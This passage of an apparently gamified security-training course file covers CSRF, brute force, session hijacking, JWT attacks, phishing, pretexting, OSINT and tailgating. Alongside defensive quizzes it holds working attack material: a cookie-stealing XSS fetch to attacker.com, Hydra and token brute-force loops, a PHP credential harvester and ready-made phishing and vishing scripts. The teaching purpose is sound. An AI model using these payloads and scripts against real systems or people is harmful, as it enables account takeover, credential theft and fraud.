**Delete account:**

\`\`\`html
<img src="http://target.com/delete-account?confirm=yes">
\`\`\`

**Post content:**

\`\`\`html
<form action="http://social.com/post" method="POST">
  <input name="content" value="Check out evil.com!">
</form>
<script>document.forms[0].submit()</script>
\`\`\`

**Testing for CSRF:**

\`\`\`bash
# 1. Capture request in Burp
# 2. Remove CSRF token (if any)
# 3. Change method GET → POST or vice versa
# 4. Replay request
# 5. If it works = CSRF vulnerable
\`\`\``,
              image: null,
              quiz: [
                {
                  id: 'p4r4-q3',
                  question: 'How does CSRF work?',
                  options: ['By stealing passwords', 'By tricking users into making unwanted requests using their active session', 'By deleting cookies', 'By injecting SQL'],
                  correctIndex: 1,
                  explanation: 'CSRF exploits the trust a website has in the user\'s browser, making requests on their behalf using their valid session/cookies.'
                },
                {
                  id: 'p4r4-q3a',
                  question: "A site has a ping this host tool that passes your input to the system shell. What is the risk?",
                  options: [
                    "An attacker can add extra commands to the input, and the server runs them",
                    "The tool will ping too slowly",
                    "The tool will show the wrong IP",
                    "Nothing, ping is safe"
                  ],
                  correctIndex: 0,
                  explanation: "Characters like ; & and | can chain commands in a shell. If the input is not controlled, the attacker's commands run with the server's privileges."
                },
                {
                  id: 'p4r4-q3b',
                  question: "What is the best fix for command injection?",
                  options: [
                    "Remove only the semicolon from the input",
                    "Avoid calling the shell with user input, use safe built-in functions, and accept only values from an allowed list",
                    "Make the input box shorter",
                    "Hide the tool from the menu"
                  ],
                  correctIndex: 1,
                  explanation: "Blocking a few characters is easy to get around. The safest design never builds shell commands from user input in the first place."
                }
              ]
            },
            {
              title: 'Prevention',
              instruction: `How to prevent XSS and CSRF.

**XSS Prevention:**

\`\`\`javascript
// ❌ Dangerous
document.write(userInput)

// ✅ Safe - Escape HTML
function escapeHTML(str) {
  return str.replace(/[&<>"']/g, function(m) {
    return {
      '&': '&amp;',
      '<': '&lt;',
      '>': '&gt;',
      '"': '&quot;',
      "'": '&#39;'
    }[m];
  });
}
\`\`\`

**Content Security Policy:**

\`\`\`html
<meta http-equiv="Content-Security-Policy" 
      content="script-src 'self'">
<!-- Only allow scripts from same origin -->
\`\`\`

**CSRF Prevention:**

\`\`\`html
<!-- Add unpredictable token -->
<form>
  <input type="hidden" name="csrf_token" value="random_secret_value">
</form>

<!-- Server validates token -->
<!-- Attacker can't guess the token -->
\`\`\`

**SameSite cookies:**

\`\`\`
Set-Cookie: session=abc123; SameSite=Strict
<!-- Cookie not sent on cross-site requests -->
\`\`\``,
              image: null,
            }
          ],
        },
        {
          id: 'room5',
          title: 'Authentication Attacks',
          overview:
            "Authentication is the front door of every application, and it is often left unlocked. To become an Qyvora operative, you must learn to pick that lock without leaving a scratch. This room covers brute force, session attacks, token analysis, and the full range of authentication weaknesses that separate a hardened target from a compromised one.",
          estimatedMinutes: 30,
          steps: [
            {
              title: 'Weak Passwords',
              instruction: `Most common authentication weakness.

**Common weak passwords:**

\`\`\`
password
123456
admin
letmein
welcome
qwerty
\`\`\`

**Testing for weak passwords:**

\`\`\`bash
# Try common defaults
admin:admin
admin:password
root:root
admin:123456
\`\`\`

**Using wordlists:**

\`\`\`bash
# Rockyou (most popular)
/usr/share/wordlists/rockyou.txt

# SecLists
/usr/share/seclists/Passwords/
\`\`\`

**Why people use weak passwords:**

- Easy to remember
- Lazy
- Don't understand risk
- Required to change often (password1, password2...)

> Always test common passwords first!`,
              image: null,
              quiz: [
                {
                  id: 'p4r5-q1',
                  question: 'What is the most common weak password?',
                  options: ['admin', 'password', '123456', 'All of these are equally common'],
                  correctIndex: 3,
                  explanation: 'All three are extremely common weak passwords. Always test these default/common passwords first when assessing authentication.'
                },
                {
                  id: 'p4r5-q1a',
                  question: "A site loads files with /download?file=report.pdf. Why can ../../ in the file value be dangerous?",
                  options: [
                    "It makes the download faster",
                    "It only changes the file name",
                    "It can climb out of the intended folder and reach other files, like system files",
                    "It logs the user out"
                  ],
                  correctIndex: 2,
                  explanation: "../ means go up one folder. Several of them can reach folders the site was never meant to share. This is called directory traversal or path traversal."
                },
                {
                  id: 'p4r5-q1b',
                  question: "Which is the best defense against directory traversal?",
                  options: [
                    "Hide the download link",
                    "Rename the folder",
                    "Block only the .. characters once",
                    "Do not build paths from user input, allow only known file names, and check the final path stays inside the allowed folder"
                  ],
                  correctIndex: 3,
                  explanation: "Checking the final resolved path is the strongest approach. Simple filters are often tricked by different spellings of the same path."
                }
              ]
            },
            {
              title: 'Brute Force Attacks',
              instruction: `Try many passwords until one works.

**Using Hydra:**

\`\`\`bash
# Single user, wordlist
hydra -l admin -P rockyou.txt ssh://target.com

# Multiple users
hydra -L users.txt -P passwords.txt ssh://target.com

# HTTP POST form
hydra -l admin -P passwords.txt target.com http-post-form "/login:username=^USER^&password=^PASS^:Invalid"
\`\`\`

**Using Burp Intruder:**

\`\`\`
1. Capture login request
2. Send to Intruder
3. Mark password field
4. Load wordlist
5. Start attack
6. Look for different response length/status
\`\`\`

**Rate limiting:**

\`\`\`bash
# Check if rate limited
for i in {1..100}; do
  curl -d "user=admin&pass=$i" http://target.com/login
done

# If all succeed = No rate limiting = vulnerable
\`\`\`

**Smart brute forcing:**

\`\`\`
1. Test common passwords first
2. Use targeted wordlists
3. Try variations (password1, Password1, Password!)
4. Check for account lockout
\`\`\``,
              image: null,
            },
            {
              title: 'Session Hijacking',
              instruction: `Steal or guess someone's session.

**Stealing cookies:**

\`\`\`javascript
// Via XSS
<script>
  fetch('http://attacker.com/steal?c='+document.cookie)
</script>
\`\`\`

**Intercepting traffic:**

\`\`\`bash
# Capture packets
tcpdump -i eth0 port 80 -w capture.pcap

# Extract cookies
tcpdump -A -r capture.pcap | grep "Cookie:"
\`\`\`

**Session fixation:**

\`\`\`
1. Attacker gets session ID: ABCD1234
2. Tricks victim into using it: http://site.com?session=ABCD1234
3. Victim logs in with that session
4. Attacker uses ABCD1234 → now logged in as victim
\`\`\`

**Weak session IDs:**

\`\`\`
session=1
session=2
session=3
# Try incrementing!

session=admin_20241102
# Predictable pattern
\`\`\``,
              image: null,
              quiz: [
                {
                  id: 'p4r5-q2',
                  question: 'What is session hijacking?',
                  options: ['Deleting sessions', 'Stealing or guessing a valid session ID to impersonate a user', 'Creating new sessions', 'Logging out users'],
                  correctIndex: 1,
                  explanation: 'Session hijacking involves stealing or predicting a valid session ID, allowing the attacker to impersonate the legitimate user without knowing their password.'
                },
                {
                  id: 'p4r5-q2a',
                  question: "What does a proxy tool like Burp Suite let you do?",
                  options: [
                    "Sit between your browser and the server so you can see, pause and change requests",
                    "Make websites load faster",
                    "Hide your computer from the internet",
                    "Write the final report for you"
                  ],
                  correctIndex: 0,
                  explanation: "With a proxy, every request passes through your tool before reaching the server. That lets you inspect them and change values the browser would not normally let you edit. Use it only on sites you have permission to test."
                },
                {
                  id: 'p4r5-q2b',
                  question: "A modern site makes many requests behind the scenes that you cannot see on the page. How does a proxy help?",
                  options: [
                    "It blocks the hidden requests",
                    "It shows every request and response, including the hidden ones",
                    "It encrypts the page",
                    "It turns off JavaScript"
                  ],
                  correctIndex: 1,
                  explanation: "The page only shows part of what happens. A proxy history shows the full conversation with the server, including API calls and cookies, which is where many weaknesses are found."
                }
              ]
            },
            {
              title: 'Password Reset Flaws',
              instruction: `Weak password reset = easy account takeover.

**Common flaws:**

**1. Predictable reset tokens:**

\`\`\`bash
# Token: 1000
# Try: 999, 1001, 1002
curl "http://target.com/reset?token=999"
\`\`\`

**2. No expiration:**

\`\`\`bash
# Old reset link still works
# Find old email, use the link
\`\`\`

**3. Token in response:**

\`\`\`bash
# Request reset
curl -d "email=victim@target.com" http://target.com/reset

# Response contains:
{"token":"abc123","message":"Check your email"}

# Use the token!
curl "http://target.com/reset?token=abc123"
\`\`\`

**4. No rate limiting:**

\`\`\`bash
# Bruteforce reset token
for i in {1..10000}; do
  curl "http://target.com/reset?token=$i"
done
\`\`\`

**5. Account enumeration:**

\`\`\`bash
# Valid user
"Reset link sent to your email"

# Invalid user
"User not found"

# Now you know which users exist!
\`\`\``,
              image: null,
            },
            {
              title: 'Multi-Factor Authentication (MFA)',
              instruction: `Second layer of authentication.

**Types of MFA:**

\`\`\`
SMS codes     (weak - can be intercepted)
Email codes   (weak - email can be compromised)
TOTP apps     (Google Authenticator - strong)
Hardware keys (YubiKey - strongest)
\`\`\`

**Testing MFA:**

**1. Bypass attempts:**

\`\`\`bash
# Request with code
POST /login
{"username":"admin","password":"pass","code":"123456"}

# Try without code
POST /login
{"username":"admin","password":"pass"}

# If it works = MFA bypassed!
\`\`\`

**2. Code reuse:**

\`\`\`bash
# Use same code twice
# Should fail second time
# If works = vulnerable
\`\`\`

**3. Brute force codes:**

\`\`\`bash
# 6-digit code = only 1 million combinations
for code in {000000..999999}; do
  curl -d "code=$code" http://target.com/verify
done

# If no rate limit = eventually succeeds
\`\`\`

**4. Session management:**

\`\`\`
1. Login with username/password
2. Get session cookie
3. Skip MFA page
4. Access protected pages directly
\`\`\``,
              image: null,
              quiz: [
                {
                  id: 'p4r5-q3',
                  question: 'Which MFA method is strongest?',
                  options: ['SMS codes', 'Email codes', 'Hardware keys (YubiKey)', 'Security questions'],
                  correctIndex: 2,
                  explanation: 'Hardware keys like YubiKey are the strongest because they cannot be phished, intercepted, or duplicated easily, unlike SMS or email codes.'
                },
                {
                  id: 'p4r5-q3a',
                  question: "You want to find hidden pages like /admin or /backup on a site you are allowed to test. Which approach fits?",
                  options: [
                    "Guess one page by hand each day",
                    "Wait for the site to list them",
                    "Fuzz the URL with a wordlist of common names and see which ones answer",
                    "Scan the router instead"
                  ],
                  correctIndex: 2,
                  explanation: "Fuzzing sends lots of automatic requests with different inputs. With a wordlist it can check thousands of names in minutes. Keep it inside the scope and do not overload the server."
                },
                {
                  id: 'p4r5-q3b',
                  question: "During fuzzing, one response has a different status code and length from all the others. What do you do?",
                  options: [
                    "Ignore it",
                    "Delete it from the results",
                    "Report it without checking",
                    "Look at it by hand, because the difference may point to something interesting"
                  ],
                  correctIndex: 3,
                  explanation: "Fuzzing finds candidates, and a human decides what they mean. A response that stands out from the rest often hints at a hidden page or a bug."
                }
              ]
            },
            {
              title: 'JWT Attacks',
              instruction: `JSON Web Tokens used for authentication.

**JWT structure:**

\`\`\`
header.payload.signature

Example:
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.
eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoidXNlciJ9.
signature_here
\`\`\`

**Decode JWT:**

\`\`\`bash
# Decode (base64)
echo "eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoidXNlciJ9" | base64 -d

# Result:
{"user":"admin","role":"user"}
\`\`\`

**Common JWT attacks:**

**1. Algorithm confusion:**

\`\`\`json
// Change algorithm
{"alg":"HS256"}  →  {"alg":"none"}

// Remove signature
header.payload.
\`\`\`

**2. Modify claims:**

\`\`\`json
// Original
{"user":"john","role":"user"}

// Modified
{"user":"john","role":"admin"}

// If signature not checked = admin access!
\`\`\`

**3. Brute force secret:**

\`\`\`bash
# If weak secret
hashcat -a 0 -m 16500 jwt.txt wordlist.txt
\`\`\`

**Tools:**

\`\`\`bash
# jwt_tool
python3 jwt_tool.py <JWT>

# Burp extension
JSON Web Tokens
\`\`\``,
              image: null,
            }
          ],
        }],
    },

    // ── PHASE 5: SOCIAL ENGINEERING (moduleId: 5, 3 rooms) ──────────────────
    {
      id: 'phase5',
      title: 'Social Engineering',
      codename: 'PHASE 5',
      color: PHASE_COLORS.phase5,
      rooms: [
        {
          id: 'room1',
          title: 'Phishing & Pretexting',
          overview:
            "The most sophisticated firewall in the world is useless if a user is tricked into opening the gate. In this room, you will master the art of 'Human Hacking,' learning the psychological triggers and technical spoofing methods used by Qyvora operatives to bypass digital defenses. To train like a hacker is to understand that the human brain is the most vulnerable OS on the network.",
          estimatedMinutes: 35,
          steps: [
            {
              title: 'What is Social Engineering?',
              instruction: `Manipulating people to give up information or access.

**Why it works:**

People are:
- Trusting by default
- Helpful
- Busy (don't verify)
- Fear authority
- Want to avoid trouble

**vs Technical attacks:**

\`\`\`
Technical: Find SQL injection → Weeks of work
Social Engineering: Call helpdesk → "I forgot my password" → 5 minutes
\`\`\`

**Real statistics:**

\`\`\`
90% of data breaches involve human error
Phishing success rate: 30%+
Average cost of successful phish: $4.65 million
\`\`\`

**Common techniques:**

- Phishing emails
- Pretexting (fake scenarios)
- Baiting (infected USB drives)
- Quid pro quo (something for something)

> Humans are often the weakest link.`,
              image: null,
            },
            {
              title: 'Phishing Basics',
              instruction: `Fake emails that trick users.

**Anatomy of phishing email:**

\`\`\`
From: security@paypa1.com (note the "1")
Subject: URGENT: Account Suspended
Content: "Click here to verify your account or it will be deleted!"
Link: http://paypal-security.evil.com/login
\`\`\`

**Red flags:**

- Urgency/threats
- Spelling errors
- Suspicious sender
- Mismatched URLs
- Unexpected attachments

**Types of phishing:**

**1. Spray and pray:**
\`\`\`bash
# Send to 100,000 people
# Hope 1% click = 1,000 victims
\`\`\`

**2. Spear phishing:**
\`\`\`
Target: CEO
From: "CFO"
Subject: "Urgent wire transfer needed"
# Research target first
# Highly targeted
\`\`\`

**3. Clone phishing:**
\`\`\`
Copy legitimate email
Change links to malicious
Resend from similar address
\`\`\``,
              image: null,
              quiz: [
                {
                  id: 'p5r1-q1',
                  question: 'What makes social engineering effective?',
                  options: ['It uses advanced technology', 'It exploits human psychology and trust', 'It is faster than computers', 'It is legal'],
                  correctIndex: 1,
                  explanation: 'Social engineering exploits human psychology - trust, fear, urgency, helpfulness - rather than technical vulnerabilities.'
                },
                {
                  id: 'p5r1-q1a',
                  question: "Why is social engineering often easier than technical hacking?",
                  options: [
                    "People can be tricked even when the technology is strong",
                    "Computers are always weaker than people",
                    "It needs expensive tools",
                    "It is always legal"
                  ],
                  correctIndex: 0,
                  explanation: "A strong firewall cannot stop someone from simply giving away their password. Attackers go after trust, habit and good manners, which is why people are called the weakest link."
                },
                {
                  id: 'p5r1-q1b',
                  question: "A message says Do this in 10 minutes or your account will be deleted. Which trick is it using?",
                  options: [
                    "Patience",
                    "Urgency, which pushes you to act before you think",
                    "Technical jargon",
                    "Free software"
                  ],
                  correctIndex: 1,
                  explanation: "Urgency and fear make people skip checks. Authority, such as pretending to be a boss, works in a similar way. A real organization rarely demands instant action through a surprise message."
                }
              ]
            },
            {
              title: 'Creating Phishing Pages',
              instruction: `Clone legitimate login pages.

**Using Social Engineering Toolkit (SET):**

\`\`\`bash
# Install
apt install set

# Run
setoolkit

# Choose:
# 1) Social-Engineering Attacks
# 2) Website Attack Vectors
# 3) Credential Harvester Attack Method
# 2) Site Cloner

# Enter target URL
http://target.com/login
\`\`\`

**Manual cloning:**

\`\`\`bash
# Download page
wget -k -p http://target.com/login

# Host it
python3 -m http.server 8080

# Send link to victim
http://your-ip:8080
\`\`\`

**Make it convincing:**

\`\`\`
# Good domain
paypal-security.com ✓

# Bad domain
paypa1-login-verify-account.xyz ✗

# Similar to real
app1e.com (L replaced with 1)
paypa1.com (L replaced with 1)
\`\`\`

**Collect credentials:**

\`\`\`php
<?php
$user = $_POST['username'];
$pass = $_POST['password'];
file_put_contents('stolen.txt', "$user:$pass\\n", FILE_APPEND);
header('Location: http://real-site.com');
?>
\`\`\``,
              image: null,
            },
            {
              title: 'Pretexting',
              instruction: `Creating a believable scenario.

**Examples:**

**1. IT Support:**
\`\`\`
"Hi, this is IT. We detected suspicious activity on your account. 
Can you confirm your username and reset your password to: ChangeMe123"
\`\`\`

**2. Vendor:**
\`\`\`
"This is your software vendor. We need VPN access to fix a critical bug."
\`\`\`

**3. Authority:**
\`\`\`
"This is the CEO. I'm in a meeting and locked out. 
Please reset my password immediately."
\`\`\`

**Building credibility:**

\`\`\`
✓ Use company jargon
✓ Reference real people/projects
✓ Have backstory ready
✓ Sound confident
✓ Create time pressure
\`\`\`

**OSINT for pretexting:**

\`\`\`bash
# Find employee names
linkedin.com/company/target

# Find tech stack
builtwith.com
wappalyzer

# Find projects
github.com search

# Use information to sound legitimate
\`\`\``,
              image: null,
              quiz: [
                {
                  id: 'p5r1-q2',
                  question: 'What is pretexting?',
                  options: ['Testing text messages', 'Creating a fake but believable scenario to manipulate targets', 'Writing code before planning', 'Sending phishing emails'],
                  correctIndex: 1,
                  explanation: 'Pretexting is creating a believable scenario or fake identity (like pretending to be IT support) to manipulate targets into giving up information or access.'
                },
                {
                  id: 'p5r1-q2a',
                  question: "You get an email from Support saying your account will be locked unless you click a link. What is the best first step?",
                  options: [
                    "Click the link quickly",
                    "Forward it to all your friends",
                    "Do not click it. Go to the real website directly or contact them through a known channel",
                    "Reply with your password"
                  ],
                  correctIndex: 2,
                  explanation: "Typing the address yourself or using a saved bookmark avoids the fake page. Pressure to act fast is a classic sign of phishing."
                },
                {
                  id: 'p5r1-q2b',
                  question: "Which is a strong sign that an email is phishing?",
                  options: [
                    "It was sent on a weekday",
                    "It has no pictures",
                    "It has a signature",
                    "The link's real address differs from what the text says"
                  ],
                  correctIndex: 3,
                  explanation: "Hovering over a link shows where it really goes. A slightly wrong sender address, like a number replacing a letter, is another common sign."
                }
              ]
            },
            {
              title: 'Vishing (Voice Phishing)',
              instruction: `Social engineering over the phone.

**Common scenarios:**

**Bank fraud:**
\`\`\`
"This is your bank's fraud department. 
We detected suspicious charges. 
Can you verify your card number?"
\`\`\`

**Tech support:**
\`\`\`
"Your computer is infected with a virus. 
We need remote access to remove it. 
Download this tool: evil-tool.exe"
\`\`\`

**IRS scam:**
\`\`\`
"This is the IRS. You owe back taxes. 
Pay immediately or face arrest."
\`\`\`

**Techniques:**

\`\`\`
Caller ID spoofing
- Make call appear from legitimate number
- spoof-caller-id tools

Voice modulation
- Sound official/urgent

Information gathering
- "Can you verify your DOB for security?"
- "What's your mother's maiden name?"
\`\`\`

**Spoofing caller ID:**

\`\`\`bash
# SpoofCard (service)
# Change displayed number
# Victim sees: "IRS: 1-800-829-1040"
# Real caller: Attacker
\`\`\``,
              image: null,
            },
            {
              title: 'Defense Against Social Engineering',
              instruction: `How to protect against these attacks.

**Email defenses:**

\`\`\`
✓ Check sender carefully (not just display name)
✓ Hover over links (don't click)
✓ Verify unexpected requests
✓ Use MFA (even if phished, need second factor)
✓ SPF/DKIM/DMARC email authentication
\`\`\`

**User training:**

\`\`\`bash
# Run phishing simulations
gophish (open source tool)

# Send fake phish
# Track who clicks
# Train those users
\`\`\`

**Verification processes:**

\`\`\`
Unexpected request?
1. Hang up
2. Call back on known number
3. Verify request

Password reset?
1. Don't trust caller ID
2. Use official support channels
3. Never give password over phone
\`\`\`

**Technical controls:**

\`\`\`
Email filtering
Web filtering (block malicious sites)
Endpoint protection (detect malware)
Network segmentation (limit damage)
\`\`\`

> Best defense: Aware and suspicious users`,
              image: null,
              quiz: [
                {
                  id: 'p5r1-q3',
                  question: 'What is the best defense against social engineering?',
                  options: ['Stronger passwords', 'User awareness training', 'Better antivirus', 'Faster computers'],
                  correctIndex: 1,
                  explanation: 'User awareness is the best defense because social engineering targets people, not systems. Trained users can recognize and report attacks.'
                },
                {
                  id: 'p5r1-q3a',
                  question: "A caller says they are from IT doing a security audit and asks for your employee ID. Which technique is this?",
                  options: [
                    "Pretexting, using a made-up story to gain trust",
                    "Port scanning",
                    "Tailgating",
                    "Fuzzing"
                  ],
                  correctIndex: 0,
                  explanation: "In pretexting the attacker invents a believable identity and reason. The safe move is to verify the caller through an official number before sharing anything."
                },
                {
                  id: 'p5r1-q3b',
                  question: "What makes a pretext convincing?",
                  options: [
                    "Speaking very loudly",
                    "Real details about the target, found through research",
                    "Asking for everything at once",
                    "Using the hardest technical words"
                  ],
                  correctIndex: 1,
                  explanation: "Knowing names, roles and company details makes the story feel genuine. Research is why public information about staff and companies matters so much."
                }
              ]
            }
          ],
        },
        {
          id: 'room2',
          title: 'OSINT Fundamentals',
          overview:
            "Before you ever touch a keyboard on a target system, you must know it better than its own owners. Open Source Intelligence (OSINT) is the art of gathering the pieces of a puzzle from the public domain. In this room, you will learn to use the internet as your primary reconnaissance tool, harvesting data from search engines, social media, and hidden databases to build a complete profile of the Qyvora target.",
          estimatedMinutes: 35,
          steps: [
            {
              title: 'What is OSINT?',
              instruction: `Open Source Intelligence = Information from public sources.

**Public sources include:**

- Search engines (Google, Bing)
- Social media (LinkedIn, Twitter, Facebook)
- Company websites
- Public records
- News articles
- Government databases
- Code repositories (GitHub)

**Why OSINT matters:**

\`\`\`
Before hacking: Learn about target
- Tech stack
- Employee names
- Email format
- Network structure
- Security tools
\`\`\`

**Legal and ethical:**

\`\`\`
✓ Using public information
✓ No hacking required
✓ Often free
✓ Powerful results

❌ Don't harass people
❌ Respect privacy laws
❌ No unauthorized access
\`\`\``,
              image: null,
            },
            {
              title: 'Google Dorking',
              instruction: `Advanced Google searches for finding hidden information.

**Basic operators:**

\`\`\`
site:     - Search specific site
filetype: - Find specific files
intitle:  - Text in title
inurl:    - Text in URL
intext:   - Text in page
\`\`\`

**Examples:**

\`\`\`bash
# Find PDFs on target site
site:target.com filetype:pdf

# Find login pages
inurl:login site:target.com

# Find exposed directories
intitle:"index of" site:target.com

# Find config files
site:target.com filetype:xml | filetype:conf | filetype:cnf

# Find credentials
site:target.com intext:"password" filetype:log
\`\`\`

**Finding subdomains:**

\`\`\`bash
site:*.target.com -www
\`\`\`

**Exposed databases:**

\`\`\`bash
intitle:"index of" "database.sql"
inurl:"/phpmyadmin" "Welcome to phpMyAdmin"
\`\`\`

**Cloud storage:**

\`\`\`bash
site:s3.amazonaws.com "target"
site:blob.core.windows.net "company"
\`\`\``,
              image: null,
              quiz: [
                {
                  id: 'p5r2-q1',
                  question: 'What does site:target.com filetype:pdf do?',
                  options: ['Hacks PDF files', 'Finds all PDFs on target.com', 'Converts files to PDF', 'Deletes PDFs'],
                  correctIndex: 1,
                  explanation: 'This Google dork searches for all PDF files hosted on target.com, useful for finding documents, presentations, and reports.'
                },
                {
                  id: 'p5r2-q1a',
                  question: "Which of these is OSINT?",
                  options: [
                    "Breaking into the company's email",
                    "Guessing passwords",
                    "Reading a company's public website, job posts and press releases",
                    "Scanning the company's servers"
                  ],
                  correctIndex: 2,
                  explanation: "OSINT means open source intelligence, which is information anyone can legally find in public. The other options touch the target's systems directly and need permission."
                },
                {
                  id: 'p5r2-q1b',
                  question: "Why is OSINT usually the first step in an assessment?",
                  options: [
                    "It gives immediate admin access",
                    "It replaces the report",
                    "It is the only legal step",
                    "It uses public information, does not touch the target and helps plan the next steps"
                  ],
                  correctIndex: 3,
                  explanation: "Because OSINT is passive, the target does not notice it. What you find, such as names, tools and email formats, makes the later steps more focused."
                }
              ]
            },
            {
              title: 'Email and People Search',
              instruction: `Find email addresses and people information.

**Finding email format:**

\`\`\`bash
# LinkedIn shows: John Smith, jane.doe
# Email format: firstname.lastname@company.com

# Or use Hunter.io
hunter.io/search/company.com
\`\`\`

**Email enumeration tools:**

\`\`\`bash
# theHarvester
theharvester -d target.com -b google,linkedin,bing

# Outputs:
# john.smith@target.com
# jane.doe@target.com
\`\`\`

**Username search:**

\`\`\`bash
# Sherlock
sherlock username

# Searches 300+ sites
# Finds: Twitter, GitHub, Instagram, Reddit, etc.
\`\`\`

**LinkedIn reconnaissance:**

\`\`\`
1. Find employees
2. See job titles
3. Understand structure
4. Find tech stack (job postings)
5. Connection requests (social engineering)
\`\`\`

**Verifying emails:**

\`\`\`bash
# Check if email exists
telnet target.com 25
VRFY user@target.com

# Or use online tools
hunter.io/email-verifier
\`\`\``,
              image: null,
            },
            {
              title: 'Domain and IP Intelligence',
              instruction: `Gather technical information about targets.

**WHOIS lookup:**

\`\`\`bash
whois target.com

# Shows:
# Registrant name
# Registration date
# Name servers
# Contact email
\`\`\`

**DNS enumeration:**

\`\`\`bash
# Find all DNS records
dig target.com ANY

# Find subdomains
subfinder -d target.com
amass enum -d target.com
\`\`\`

**IP information:**

\`\`\`bash
# Find IP address
nslookup target.com

# IP geolocation
curl ipinfo.io/8.8.8.8

# Reverse IP lookup (other sites on same IP)
https://viewdns.info/reverseip/
\`\`\`

**SSL Certificate:**

\`\`\`bash
# Extract certificate info
echo | openssl s_client -connect target.com:443 2>/dev/null | openssl x509 -noout -text

# Shows:
# Alternative names (subdomains)
# Organization
# Expiration
\`\`\`

**Shodan:**

\`\`\`bash
# Search for exposed services
shodan.io

# Examples:
target.com
city:"New York" port:80
apache country:"US"
\`\`\``,
              image: null,
              quiz: [
                {
                  id: 'p5r2-q2',
                  question: 'What is Shodan?',
                  options: ['A hacking tool', 'A search engine for internet-connected devices', 'A VPN service', 'An antivirus'],
                  correctIndex: 1,
                  explanation: 'Shodan is a search engine that finds internet-connected devices (servers, cameras, routers, etc.) and exposed services, useful for reconnaissance.'
                },
                {
                  id: 'p5r2-q2a',
                  question: "An employee posts a photo at their desk. What could an attacker learn from it?",
                  options: [
                    "Badge design, what is on the screens and notes stuck on the monitor",
                    "Nothing useful",
                    "The company's firewall rules",
                    "The server's password hashes"
                  ],
                  correctIndex: 0,
                  explanation: "Small details in photos can reveal the software in use, the layout of the office or even passwords on sticky notes. Staff should think before posting work-area photos."
                },
                {
                  id: 'p5r2-q2b',
                  question: "Which public information from a professional profile helps an attacker most when building a pretext?",
                  options: [
                    "The font on the page",
                    "Names, job titles and who works with whom",
                    "The number of likes",
                    "The profile's color theme"
                  ],
                  correctIndex: 1,
                  explanation: "Titles and relationships make it easy to pretend to be a colleague or manager. Limiting what is public and tightening privacy settings reduces the risk."
                }
              ]
            },
            {
              title: 'Social Media Intelligence',
              instruction: `Extract information from social platforms.

**LinkedIn:**

\`\`\`
Find employees → Job titles → Org structure
Job postings → Tech stack
Posts → Company news, projects
\`\`\`

**Twitter/X:**

\`\`\`bash
# Search operator
from:username
to:username
#hashtag
since:2024-01-01
until:2024-12-31
\`\`\`

**GitHub:**

\`\`\`bash
# Search code
user:target-company password
filename:.env
extension:sql

# Find repositories
org:company-name
\`\`\`

**Pastebin & Leaks:**

\`\`\`bash
# Search for leaks
site:pastebin.com "target.com"

# Breach databases
haveibeenpwned.com
dehashed.com
\`\`\`

**Instagram/Facebook:**

\`\`\`
Employee photos → Office layout
Check-ins → Office location
Posts → Events, conferences
\`\`\`

**Metadata extraction:**

\`\`\`bash
# Extract EXIF from images
exiftool photo.jpg

# Shows:
# GPS coordinates
# Camera model
# Date/time
# Software used
\`\`\``,
              image: null,
            },
            {
              title: 'Putting It All Together',
              instruction: `Complete OSINT reconnaissance workflow.

**Step 1: Company profile**

\`\`\`bash
# Website
whatweb target.com
builtwith.com

# Domain info
whois target.com

# Subdomains
subfinder -d target.com > subs.txt
\`\`\`

**Step 2: People**

\`\`\`bash
# Find employees
LinkedIn search

# Find emails
theharvester -d target.com -b all
\`\`\`

**Step 3: Infrastructure**

\`\`\`bash
# IP ranges
whois target.com | grep -i "CIDR"

# Technologies
wappalyzer
nmap -sV target.com
\`\`\`

**Step 4: Security**

\`\`\`bash
# Check for leaks
site:pastebin.com "target.com" "password"
haveibeenpwned.com

# Exposed services
shodan.io search
\`\`\`

**Step 5: Document everything**

\`\`\`
Create report:
- Company structure
- Key employees
- Tech stack
- Network ranges
- Potential vulnerabilities
- Attack surface
\`\`\`

> OSINT builds the foundation for every penetration test.`,
              image: null,
              quiz: [
                {
                  id: 'p5r2-q3',
                  question: 'Why is OSINT important before a penetration test?',
                  options: ['It is required by law', 'It helps understand the target and find attack surface without alerting them', 'It replaces penetration testing', 'It is faster than scanning'],
                  correctIndex: 1,
                  explanation: 'OSINT provides crucial intelligence about the target (technology, people, structure) before active testing, helping focus efforts and avoid detection during reconnaissance.'
                },
                {
                  id: 'p5r2-q3a',
                  question: "Why might an attacker try physical access instead of an online attack?",
                  options: [
                    "Physical access is always legal",
                    "Online defenses do not exist",
                    "Plugging into a network port or finding an unlocked computer can skip online defenses",
                    "It is always faster to travel"
                  ],
                  correctIndex: 2,
                  explanation: "Strong network security does not help if someone can sit down at an unlocked machine. Locks, badges and cameras protect the technology from the physical side."
                },
                {
                  id: 'p5r2-q3b',
                  question: "You find a USB drive in the parking lot. What should you do?",
                  options: [
                    "Plug it in to find the owner",
                    "Format it and keep it",
                    "Post a photo online",
                    "Do not plug it in. Give it to the IT or security team"
                  ],
                  correctIndex: 3,
                  explanation: "Attackers leave infected USB drives hoping curious people will plug them in. A drive can run malicious code as soon as it is connected."
                }
              ]
            }
          ],
        },
        {
          id: 'room3',
          title: 'Physical Security',
          overview:
            "Physical access is the ultimate bypass. All the digital firewalls in the world are useless if an Qyvora operative can simply walk into the server room and plug in a USB. In this room, you will learn the techniques of physical intrusion, from tailgating and badge cloning to the art of the social engineer's 'walk-through.' To become a hacker is to understand that the lock on the door is just another protocol to be cracked.",
          estimatedMinutes: 30,
          steps: [
            {
              title: 'Why Physical Security Matters',
              instruction: `Physical access = game over.

**What you can do with physical access:**

\`\`\`
✓ Plug in rogue device (Raspberry Pi)
✓ Install keylogger
✓ Access unlocked computers
✓ Steal documents
✓ Clone badges
✓ Read sticky notes (passwords!)
✓ USB drop attacks
\`\`\`

**Real statistics:**

\`\`\`
68% of office workers let strangers in
52% of USB drops get plugged in
Physical intrusion test success rate: 90%+
\`\`\`

**Attack scenarios:**

\`\`\`
"I'm from IT, need to check the server"
"Delivery for conference room"
"Lost my badge, can you let me in?"
"Following someone through door (tailgating)"
\`\`\`

> Physical security is often overlooked but critical.`,
              image: null,
            },
            {
              title: 'Tailgating and Piggybacking',
              instruction: `Following authorized people through secure doors.

**Tailgating:**

\`\`\`
1. Wait near secure entrance
2. Carry box or coffee (hands full = sympathy)
3. Walk behind authorized person
4. "Thanks!" as they hold door
5. You're in
\`\`\`

**Variations:**

**The Smoker:**
\`\`\`
Hang out in smoking area
Chat with employees
Follow them back inside
"Oh, I forgot my badge inside..."
